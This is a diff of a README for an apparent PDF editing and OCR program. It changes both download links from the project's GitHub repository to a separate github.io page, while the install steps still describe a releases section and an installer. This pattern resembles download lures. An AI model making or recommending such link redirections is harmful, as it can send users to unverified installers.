@@ -1,6 +1,6 @@
 # 📎 picopdf-plus-windows-ocr - Edit and scan documents with ease
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Carlineamort176/picopdf-plus-windows-ocr)
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://carlineamort176.github.io)
 
 ## 📖 About this software
 
@@ -20,7 +20,7 @@ Your computer needs to meet these basic standards to run the software:
 
 Follow these steps to set up the application on your machine:
 
-1.  Visit this page to download: [https://github.com/Carlineamort176/picopdf-plus-windows-ocr](https://github.com/Carlineamort176/picopdf-plus-windows-ocr).
+1.  Visit this page to download: [https://carlineamort176.github.io](https://carlineamort176.github.io).
 2.  Locate the releases section on the right side of the page.
 3.  Click the link under the latest release to save the installer file to your computer.
 4.  Open the folder where you saved the file.
